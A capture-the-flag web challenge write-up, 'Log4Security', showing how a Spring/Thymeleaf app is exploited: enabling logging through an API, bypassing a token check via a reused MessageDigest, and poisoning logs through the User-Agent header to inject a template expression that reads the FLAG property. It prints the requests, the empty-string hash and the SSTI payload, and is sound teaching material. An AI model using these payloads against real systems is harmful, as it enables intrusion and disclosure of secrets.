<h1>Log4Security - Solution</h1>

<p><strong>Author</strong>: zeyu2001</p>

<p><strong>Category</strong>: Web</p>

<h2>Step 1 - Enable Logging Through API</h2>

<p>In <code>/api/preferences</code>, the request body is deserialized into a <code>UserPreferences</code> object.</p>

<p><code>java
@PostMapping("/api/preferences")
@ResponseBody
public String preferences(@RequestBody UserPreferences preferences) {
    try {
        userPreferences.setName(preferences.getName());
        userPreferences.setLocation(preferences.getLocation());
        userPreferences.setLogging(preferences.getLogging());
        return "OK";
    } catch (Exception e) {
        return "ERROR";
    }
}
</code></p>

<p>We can see that the <code>name</code>, <code>location</code>, and <code>logging</code> attributes are modified.</p>

<p>```java
@Component
@Scope(value = "session", proxyMode = ScopedProxyMode.TARGET_CLASS)
public class UserPreferences {
    private String name = "User";
    private String location = "World";
    private Boolean logging = false;
    private Logger logger = null;
    private final String uuid = UUID.randomUUID().toString();</p>

<pre><code>...

public void setLogging(Boolean logging) {
    this.logging = logging;
    if (this.logging == true) {
        this.resetLogger();
    }
    else {
        this.logger = null;
    }
}
</code></pre>

<p>}
```</p>

<p>The following request will enable logging for our user.</p>

<p>```http
POST /api/preferences HTTP/1.1</p>

<p>...</p>

<p>{
    "name":"User",
    "location":"World",
    "logging":true
}
```</p>

<h2>Step 2 - Authentication</h2>

<p>In order to view our account logs, we need to supply a <code>token</code>.</p>

<p>This must then match the SHA1 hash of the <code>SUPER_SECRET</code> environment variable.</p>

<p>```java
@PostMapping("/logs")
public String logs(@RequestParam("token") String token, Model model) {</p>

<pre><code>MessageDigest digestStorage;
try {
    digestStorage = MessageDigest.getInstance("SHA-1");
    digestStorage.update(System.getenv("SUPER_SECRET").getBytes("ascii"));
}
catch (Exception e) {
    model.addAttribute("logs", "Error getting secret token, please contact CTF admins.");
    return "logs";
}

if (userPreferences.getLogging()) {
    userPreferences.getLogger().info("Logging in with token " + token);

    // Log login attempt
    String correctToken = new String(Hex.encodeHex(digestStorage.digest()));
    userPreferences.getLogger().info("Login attempt with token " + token + "=" + correctToken);
}

// Invalid token
if (!token.equals(new String(Hex.encodeHex(digestStorage.digest())))) {
    model.addAttribute("logs", "Invalid token");
    return "logs";
}
</code></pre>

<p>```</p>

<p>But notice that the above logic is a bit strange. If logging is enabled, then <code>digestStorage.digest()</code> is called twice. From the <a href="https://cr.openjdk.java.net/~iris/se/11/latestSpec/api/java.base/java/security/MessageDigest.html">documentation</a>, we can clearly see that:</p>

<p><code>text
The digest method can be called once for a given number of updates. After digest has been called, the MessageDigest object is reset to its initialized state.
</code></p>

<p>Therefore, the second time that <code>digest()</code> is called, it is calculating the SHA1 of an empty string.</p>

<p><code>
$ echo -n "" | sha1
da39a3ee5e6b4b0d3255bfef95601890afd80709
</code></p>

<p>This hash allows us to authenticate successfully and view our logs.</p>

<h2>Step 3 - Log Poisoning and SSTI</h2>

<p>First of all, notice that the <code>User-Agent</code> request header is logged for every request to <code>/home</code>.</p>

<p><code>java
@GetMapping("/home")
public String home(@RequestHeader("User-Agent") String userAgent, Model model) {
    if (userPreferences.getLogging()) {
        userPreferences.getLogger().info("Visited by " + userAgent);
    }
    model.addAttribute("name", userPreferences.getName());
    model.addAttribute("location", userPreferences.getLocation());
    return "home";
}
</code></p>

<p>Next, notice that the Thymeleaf template uses <a href="https://www.thymeleaf.org/doc/articles/standarddialect5minutes.html">expression preprocessing</a> - i.e. the <code>logs</code> variable is expanded and included as part of the outer expression.</p>

<p>```html</p>

<h1>Account Logs</h1>

<p>Back to <a href="/home">home</a>.</p>

<p th:each="line : ${#strings.arraySplit('__${logs}__', T(org.apache.commons.lang3.StringUtils).LF)}">
    <span th:text="${line}"></span>
</p>

<p>```</p>

<p>Therefore, poisoning our logs with <code>' + @environment.getProperty('FLAG') + '</code> would yield:</p>

<p><code>java
${#strings.arraySplit('...' + @environment.getProperty('FLAG') + '...', T(org.apache.commons.lang3.StringUtils).LF)}
</code></p>

<p>By poisoning the logs using the following,</p>

<p>```http
GET /home HTTP/1.1</p>

<p>...</p>

<p>User-Agent: ' + @environment.getProperty('FLAG') + '</p>

<p>...
```</p>

<p>We would see this in <code>/logs</code>.</p>

<p>```html</p>

<p>
    <span>INFO: Visited by SEE{my_f1r57_j4v4_4ppl1c4710n_cd6840f49d28ae36fde53fed813fa2e1d3ba5783}</span>
</p>

<p>```</p>
